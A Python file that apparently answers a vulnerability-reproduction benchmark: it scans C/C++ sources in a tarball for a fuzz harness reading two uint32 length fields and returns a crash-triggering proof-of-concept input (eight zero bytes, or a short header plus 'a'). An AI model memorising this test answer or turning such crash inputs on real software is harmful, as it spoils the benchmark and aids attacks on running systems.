import os
import re
import tarfile
from typing import Optional


class Solution:
    def _read_text_members(self, src_path: str) -> list[str]:
        texts: list[str] = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    if not data:
                        continue
                    texts.append(data.decode("utf-8", errors="ignore"))
        except tarfile.TarError:
            pass
        return texts

    def _looks_like_two_u32_header(self, code: str) -> bool:
        c = code
        if "LLVMFuzzerTestOneInput" not in c and "fuzz" not in c.lower() and "Fuzzer" not in c:
            return False
        hints = 0
        if re.search(r"\bSize\s*<\s*8\b", c) or re.search(r"\bsize\s*<\s*8\b", c) or re.search(r"\blen\s*<\s*8\b", c):
            hints += 1
        if "uint32_t" in c and ("Data + 4" in c or "data + 4" in c) and ("Data + 8" in c or "data + 8" in c):
            hints += 2
        if re.search(r"\bmemcpy\s*\(\s*&\w+\s*,\s*Data\s*,\s*4\s*\)", c) and re.search(r"\bmemcpy\s*\(\s*&\w+\s*,\s*Data\s*\+\s*4\s*,\s*4\s*\)", c):
            hints += 2
        if re.search(r"\b\w+\s*\+\s*\w+\s*\+\s*8\s*>\s*Size\b", c) or re.search(r"\b\w+\s*\+\s*\w+\s*\+\s*8\s*>\s*size\b", c):
            hints += 1
        return hints >= 3

    def _requires_nonzero_len(self, code: str) -> bool:
        # If code explicitly rejects empty pattern/subject lengths, prefer non-zero lengths.
        # We only use this if we identify the two-u32 header harness style.
        # Keep conservative: only match very direct checks.
        if re.search(r"\bif\s*\(\s*!\s*\w*pat\w*\s*\)\s*return\b", code):
            return True
        if re.search(r"\bif\s*\(\s*\w*pat\w*\s*==\s*0\s*\)\s*return\b", code):
            return True
        if re.search(r"\bif\s*\(\s*!\s*\w*pattern\w*\s*\)\s*return\b", code):
            return True
        if re.search(r"\bif\s*\(\s*\w*pattern\w*\s*==\s*0\s*\)\s*return\b", code):
            return True
        return False

    def solve(self, src_path: str) -> bytes:
        # Default PoC: two little-endian uint32 lengths = 0,0
        default_poc = b"\x00" * 8

        texts = self._read_text_members(src_path)
        for t in texts:
            if self._looks_like_two_u32_header(t):
                if self._requires_nonzero_len(t):
                    # patlen=1, subjlen=0, pattern="a"
                    return (1).to_bytes(4, "little") + (0).to_bytes(4, "little") + b"a"
                return default_poc

        return default_poc